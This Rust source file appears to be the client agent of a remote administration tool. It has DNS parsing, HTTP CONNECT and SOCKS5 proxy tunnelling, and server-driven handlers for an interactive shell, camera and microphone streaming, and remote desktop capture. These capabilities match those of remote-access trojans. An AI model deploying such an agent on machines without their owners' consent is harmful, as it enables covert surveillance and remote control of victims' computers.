    packet.extend_from_slice(&[0x00, 0x01]);
    // Class: IN (1)
    packet.extend_from_slice(&[0x00, 0x01]);

    Some(packet)
}

/// Parse DNS response and extract first A record IP
fn parse_dns_response(response: &[u8]) -> Option<IpAddr> {
    if response.len() < 12 {
        return None;
    }

    // Check answer count
    let answer_count = u16::from_be_bytes([response[6], response[7]]);
    if answer_count == 0 {
        return None;
    }

    // Skip header (12 bytes) and question section
    let mut pos = 12;

    // Skip question section (find null terminator, then skip type and class)
    // Use checked arithmetic to prevent overflow from malformed packets
    while pos < response.len() && response[pos] != 0 {
        let label_len = response[pos] as usize;
        pos = pos.checked_add(1)?.checked_add(label_len)?;
        if pos > response.len() {
            return None;
        }
    }
    pos = pos.checked_add(5)?; // null + type (2) + class (2)
    if pos > response.len() {
        return None;
    }

    // Parse answer records (limit iterations to prevent infinite loops)
    let max_answers = answer_count.min(100) as usize;
    for _ in 0..max_answers {
        if pos.checked_add(12).map_or(true, |p| p > response.len()) {
            break;
        }

        // Skip name (might be compressed)
        if response[pos] & 0xC0 == 0xC0 {
            pos = pos.checked_add(2)?; // Pointer
        } else {
            while pos < response.len() && response[pos] != 0 {
                let label_len = response[pos] as usize;
                pos = pos.checked_add(1)?.checked_add(label_len)?;
                if pos > response.len() {
                    return None;
                }
            }
            pos = pos.checked_add(1)?;
        }

        if pos.checked_add(10).map_or(true, |p| p > response.len()) {
            break;
        }

        let rtype = u16::from_be_bytes([response[pos], response[pos + 1]]);
        let rdlength = u16::from_be_bytes([response[pos + 8], response[pos + 9]]) as usize;
        pos = pos.checked_add(10)?;

        if rtype == 1 && rdlength == 4 && pos.checked_add(4).map_or(false, |p| p <= response.len()) {
            // A record - return IPv4 address
            return Some(IpAddr::V4(std::net::Ipv4Addr::new(
                response[pos], response[pos + 1], response[pos + 2], response[pos + 3]
            )));
        }

        pos = pos.checked_add(rdlength)?;
    }

    None
}

// ============================================================================
// Proxy Connection Support
// ============================================================================

/// Connect to target through a proxy (HTTP CONNECT or SOCKS5)
async fn connect_via_proxy(proxy: &ProxyConfig, target_host: &str, target_port: u16) -> Result<TcpStream, Box<dyn std::error::Error + Send + Sync>> {
    // Resolve proxy hostname
    let proxy_ip = resolve_host(&proxy.host).await
        .ok_or("Failed to resolve proxy hostname")?;

    // Connect to proxy
    let mut stream = TcpStream::connect(SocketAddr::new(proxy_ip, proxy.port)).await?;

    match proxy.proxy_type {
        ProxyType::Http => {
            http_connect_handshake(&mut stream, target_host, target_port, &proxy.username, &proxy.password).await?;
        }
        ProxyType::Socks5 => {
            socks5_handshake(&mut stream, target_host, target_port, &proxy.username, &proxy.password).await?;
        }
    }

    Ok(stream)
}

/// Perform HTTP CONNECT handshake through proxy
async fn http_connect_handshake(
    stream: &mut TcpStream,
    target_host: &str,
    target_port: u16,
    username: &Option<String>,
    password: &Option<String>,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    // Build CONNECT request
    let mut request = format!(
        "CONNECT {}:{} HTTP/1.1\r\nHost: {}:{}\r\n",
        target_host, target_port, target_host, target_port
    );

    // Add proxy authentication if provided
    if let (Some(user), Some(pass)) = (username, password) {
        use base64::Engine;
        let credentials = format!("{}:{}", user, pass);
        let encoded = base64::engine::general_purpose::STANDARD.encode(credentials.as_bytes());
        request.push_str(&format!("Proxy-Authorization: Basic {}\r\n", encoded));
    }

    request.push_str("\r\n");

    // Send request
    stream.write_all(request.as_bytes()).await?;

    // Read response (simple parsing - look for HTTP status)
    let mut response = [0u8; 1024];
    let mut total_read = 0;

    // Read until we see \r\n\r\n (end of headers)
    loop {
        let n = stream.read(&mut response[total_read..]).await?;
        if n == 0 {
            return Err("Proxy connection closed unexpectedly".into());
        }
        total_read += n;

        // Check for end of headers
        if total_read >= 4 {
            let data = &response[..total_read];
            if data.windows(4).any(|w| w == b"\r\n\r\n") {
                break;
            }
        }

        if total_read >= response.len() {
            return Err("Proxy response too large".into());
        }
    }

    // Parse response status line
    let response_str = String::from_utf8_lossy(&response[..total_read]);
    let status_line = response_str.lines().next().unwrap_or("");

    // Check for 200 OK (HTTP/1.x 200 ...)
    if !status_line.contains(" 200 ") {
        return Err(format!("Proxy CONNECT failed: {}", status_line).into());
    }

    Ok(())
}

/// Perform SOCKS5 handshake through proxy
async fn socks5_handshake(
    stream: &mut TcpStream,
    target_host: &str,
    target_port: u16,
    username: &Option<String>,
    password: &Option<String>,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    // Determine authentication methods to offer
    let has_auth = username.is_some() && password.is_some();

    // Step 1: Send greeting with supported auth methods
    if has_auth {
        // Offer: no auth (0x00) and username/password (0x02)
        stream.write_all(&[0x05, 0x02, 0x00, 0x02]).await?;
    } else {
        // Offer: no auth only
        stream.write_all(&[0x05, 0x01, 0x00]).await?;
    }

    // Read server's chosen method
    let mut response = [0u8; 2];
    stream.read_exact(&mut response).await?;

    if response[0] != 0x05 {
        return Err("Invalid SOCKS5 response".into());
    }

    match response[1] {
        0x00 => {
            // No authentication required
        }
        0x02 => {
            // Username/password authentication required
            if let (Some(user), Some(pass)) = (username, password) {
                // Send username/password auth
                let mut auth_request = vec![0x01]; // Version 1
                auth_request.push(user.len() as u8);
                auth_request.extend_from_slice(user.as_bytes());
                auth_request.push(pass.len() as u8);
                auth_request.extend_from_slice(pass.as_bytes());

                stream.write_all(&auth_request).await?;

                // Read auth response
                let mut auth_response = [0u8; 2];
                stream.read_exact(&mut auth_response).await?;

                if auth_response[1] != 0x00 {
                    return Err("SOCKS5 authentication failed".into());
                }
            } else {
                return Err("SOCKS5 proxy requires authentication".into());
            }
        }
        0xFF => {
            return Err("SOCKS5 proxy rejected all auth methods".into());
        }
        _ => {
            return Err(format!("Unsupported SOCKS5 auth method: {}", response[1]).into());
        }
    }

    // Step 2: Send connect request
    let mut connect_request = vec![
        0x05, // Version
        0x01, // Command: CONNECT
        0x00, // Reserved
    ];

    // Try to parse as IP address first, otherwise use domain name
    if let Ok(ip) = target_host.parse::<std::net::Ipv4Addr>() {
        connect_request.push(0x01); // IPv4 address type
        connect_request.extend_from_slice(&ip.octets());
    } else if let Ok(ip) = target_host.parse::<std::net::Ipv6Addr>() {
        connect_request.push(0x04); // IPv6 address type
        connect_request.extend_from_slice(&ip.octets());
    } else {
        // Domain name
        connect_request.push(0x03); // Domain name type
        connect_request.push(target_host.len() as u8);
        connect_request.extend_from_slice(target_host.as_bytes());
    }

    // Add port (big-endian)
    connect_request.extend_from_slice(&target_port.to_be_bytes());

    stream.write_all(&connect_request).await?;

    // Read connect response
    let mut connect_response = [0u8; 10];
    stream.read_exact(&mut connect_response[..4]).await?;

    if connect_response[0] != 0x05 {
        return Err("Invalid SOCKS5 connect response".into());
    }

    if connect_response[1] != 0x00 {
        let error_msg = match connect_response[1] {
            0x01 => "General SOCKS server failure",
            0x02 => "Connection not allowed by ruleset",
            0x03 => "Network unreachable",
            0x04 => "Host unreachable",
            0x05 => "Connection refused",
            0x06 => "TTL expired",
            0x07 => "Command not supported",
            0x08 => "Address type not supported",
            _ => "Unknown SOCKS error",
        };
        return Err(format!("SOCKS5 connect failed: {}", error_msg).into());
    }

    // Read the rest of the response based on address type
    match connect_response[3] {
        0x01 => {
            // IPv4: read 4 bytes + 2 port bytes
            let mut remaining = [0u8; 6];
            stream.read_exact(&mut remaining).await?;
        }
        0x03 => {
            // Domain: read length byte, then domain, then 2 port bytes
            let mut len_byte = [0u8; 1];
            stream.read_exact(&mut len_byte).await?;
            let mut remaining = vec![0u8; len_byte[0] as usize + 2];
            stream.read_exact(&mut remaining).await?;
        }
        0x04 => {
            // IPv6: read 16 bytes + 2 port bytes
            let mut remaining = [0u8; 18];
            stream.read_exact(&mut remaining).await?;
        }
        _ => {
            return Err("Unknown SOCKS5 address type in response".into());
        }
    }

    // Connection established through proxy
    Ok(())
}

// ============================================================================
// Shell Command Handlers
// ============================================================================

/// Get or initialize the active shell mutex
fn get_shell_mutex() -> &'static Mutex<Option<ShellSession>> {
    ACTIVE_SHELL.get_or_init(|| Mutex::new(None))
}

/// Get or initialize the proxy manager mutex
fn get_proxy_mutex() -> &'static Mutex<Option<proxy::ProxyManager>> {
    PROXY_MANAGER.get_or_init(|| Mutex::new(None))
}

/// Handle ShellStart command - start a new interactive shell
async fn handle_shell_start(
    tx: mpsc::Sender<(ClientMessageType, Vec<u8>)>,
) -> (bool, CommandResponseData) {
    let shell_mutex = get_shell_mutex();

    // Check if shell already active
    {
        let shell = shell_mutex.lock();
        if shell.is_some() {
            return (false, CommandResponseData::ShellStartFailed {
                error: "Shell session already active".to_string(),
            });
        }
    }

    // Start new shell
    match shell::start_shell(tx).await {
        Ok(session) => {
            let mut shell = shell_mutex.lock();
            *shell = Some(session);
            (true, CommandResponseData::ShellStarted)
        }
        Err(e) => {
            (false, CommandResponseData::ShellStartFailed { error: e })
        }
    }
}

/// Handle ShellInput command - send input to active shell
async fn handle_shell_input(data: String) -> (bool, CommandResponseData) {
    let shell_mutex = get_shell_mutex();
    let shell = shell_mutex.lock();

    match shell.as_ref() {
        Some(session) => {
            match session.send_input(data).await {
                Ok(_) => (true, CommandResponseData::Generic {
                    message: "Input sent".to_string(),
                }),
                Err(e) => (false, CommandResponseData::Error { message: e }),
            }
        }
        None => (false, CommandResponseData::Error {
            message: "No active shell session".to_string(),
        }),
    }
}

/// Handle ShellClose command - close active shell
async fn handle_shell_close() -> (bool, CommandResponseData) {
    let shell_mutex = get_shell_mutex();
    let mut shell = shell_mutex.lock();

    match shell.take() {
        Some(session) => {
            session.close();
            (true, CommandResponseData::ShellClosed)
        }
        None => (false, CommandResponseData::Error {
            message: "No active shell session".to_string(),
        }),
    }
}

// ============================================================================
// Media Stream Handlers
// ============================================================================

/// Get or initialize the media frame tx mutex
fn get_media_tx_mutex() -> &'static Mutex<Option<mpsc::UnboundedSender<BinaryMediaFrame>>> {
    MEDIA_FRAME_TX.get_or_init(|| Mutex::new(None))
}

/// Handle StartMediaStream command
async fn handle_media_start(
    tx: mpsc::Sender<(ClientMessageType, Vec<u8>)>,
    video_device: Option<String>,
    audio_device: Option<String>,
    fps: u8,
    quality: u8,
    resolution: Option<String>,
) -> (bool, CommandResponseData) {
    // Check if already streaming
    if media::is_streaming() {
        return (false, CommandResponseData::Error {
            message: "Media stream already running".to_string(),
        });
    }

    // Create channel for frames from capture thread
    let (frame_tx, mut frame_rx) = mpsc::unbounded_channel::<BinaryMediaFrame>();

    // Store the sender so we can stop the stream later
    {
        let mut media_tx = get_media_tx_mutex().lock();
        *media_tx = Some(frame_tx.clone());
    }

    // Start the media capture
    let (success, data) = commands::start_media_stream_with_channel(
        video_device,
        audio_device,
        fps,
        quality,
        resolution,
        frame_tx,
    );

    if !success {
        let mut media_tx = get_media_tx_mutex().lock();
        *media_tx = None;
        return (success, data);
    }

    // Spawn task to forward frames to server using binary protocol
    let server_tx = tx.clone();
    tokio::spawn(async move {
        while let Some(frame) = frame_rx.recv().await {
            let payload = frame.to_bytes();
            if server_tx.send((ClientMessageType::MediaFrame, payload)).await.is_err() {
                break;
            }
        }
    });

    (success, data)
}

/// Handle StopMediaStream command
async fn handle_media_stop() -> (bool, CommandResponseData) {
    // Stop the media capture
    let result = media::stop_media_stream();

    // Clear the stored sender
    {
        let mut media_tx = get_media_tx_mutex().lock();
        *media_tx = None;
    }

    result
}

// ============================================================================
// Remote Desktop Handlers
// ============================================================================

/// Get or initialize the remote desktop frame tx mutex
fn get_rd_tx_mutex() -> &'static Mutex<Option<mpsc::UnboundedSender<Vec<u8>>>> {
    RD_FRAME_TX.get_or_init(|| Mutex::new(None))
}

/// Handle RemoteDesktopStart command
async fn handle_rd_start(
    tx: mpsc::Sender<(ClientMessageType, Vec<u8>)>,
    fps: u8,
    quality: u8,
) -> (bool, CommandResponseData) {
    // Check if already streaming
    if remotedesktop::is_streaming() {
        return (false, CommandResponseData::Error {
            message: "Remote desktop stream already running".to_string(),
        });
    }

    // Create channel for tile-encoded frames from capture thread
    let (frame_tx, mut frame_rx) = mpsc::unbounded_channel::<Vec<u8>>();

    // Store the sender so we can stop the stream later
    {
        let mut rd_tx = get_rd_tx_mutex().lock();
        *rd_tx = Some(frame_tx.clone());
    }

    // Start the remote desktop capture
    let (success, data) = remotedesktop::start_remote_desktop(
        fps,
        quality,
        frame_tx,
    );

    if !success {
        let mut rd_tx = get_rd_tx_mutex().lock();
        *rd_tx = None;
        return (success, data);
    }

    // Spawn task to forward tile-encoded frames to server
    let server_tx = tx.clone();
    tokio::spawn(async move {
        while let Some(payload) = frame_rx.recv().await {
            // Payload is already binary-encoded with tile data
            if server_tx.send((ClientMessageType::RemoteDesktopFrame, payload)).await.is_err() {
                break;
            }
        }
    });

    (success, data)
}

/// Handle RemoteDesktopStop command
async fn handle_rd_stop() -> (bool, CommandResponseData) {
    // Stop the remote desktop capture
    let result = remotedesktop::stop_remote_desktop();

    // Clear the stored sender
    {
        let mut rd_tx = get_rd_tx_mutex().lock();
        *rd_tx = None;
    }

    result
}

/// Get or initialize the H.264 remote desktop frame tx mutex
fn get_rd_h264_tx_mutex() -> &'static Mutex<Option<mpsc::UnboundedSender<remotedesktop_h264::H264Frame>>> {
    RD_H264_FRAME_TX.get_or_init(|| Mutex::new(None))
}

/// Handle RemoteDesktopH264Start command
async fn handle_rd_h264_start(
    tx: mpsc::Sender<(ClientMessageType, Vec<u8>)>,
    fps: u8,
    bitrate_mbps: u8,
    keyframe_interval_secs: u8,
) -> (bool, CommandResponseData) {
    // Check if already streaming (either JPEG or H.264)
    if remotedesktop::is_streaming() || remotedesktop_h264::is_h264_streaming() {
        return (false, CommandResponseData::Error {
            message: "Remote desktop stream already running".to_string(),
        });
    }

    // Create channel for H.264 frames from capture thread
    let (frame_tx, mut frame_rx) = mpsc::unbounded_channel::<remotedesktop_h264::H264Frame>();

    // Store the sender so we can stop the stream later
    {
        let mut h264_tx = get_rd_h264_tx_mutex().lock();
        *h264_tx = Some(frame_tx.clone());
    }

    // Configure and start H.264 streaming
    let config = remotedesktop_h264::H264StreamConfig {
        fps,
        bitrate_mbps,
        keyframe_interval_secs,
        low_latency: true,
    };

    match remotedesktop_h264::start_h264_stream(config, frame_tx) {
        Ok(result) => {
            // Spawn task to forward H.264 frames to server
            let server_tx = tx.clone();
            tokio::spawn(async move {
                while let Some(frame) = frame_rx.recv().await {
                    // Serialize H.264 frame to binary
                    let payload = frame.to_bytes();
                    if server_tx.send((ClientMessageType::RemoteDesktopH264Frame, payload)).await.is_err() {
                        break;
                    }
                }
            });

            (true, CommandResponseData::RemoteDesktopH264Started {
                width: result.width,
                height: result.height,
                is_hardware: result.is_hardware,
            })
        }
        Err(e) => {
            // Clear the stored sender
            let mut h264_tx = get_rd_h264_tx_mutex().lock();
            *h264_tx = None;

            (false, CommandResponseData::Error {
                message: format!("Failed to start H.264 stream: {}", e),
            })
        }
    }
}

/// Handle RemoteDesktopH264Stop command
async fn handle_rd_h264_stop() -> (bool, CommandResponseData) {
    // Stop the H.264 capture
    match remotedesktop_h264::stop_h264_stream() {
        Ok(()) => {
            // Clear the stored sender
            {
                let mut h264_tx = get_rd_h264_tx_mutex().lock();
                *h264_tx = None;
            }
            (true, CommandResponseData::RemoteDesktopH264Stopped)
        }
        Err(e) => {
            (false, CommandResponseData::Error {
                message: e,
            })
        }
    }
}
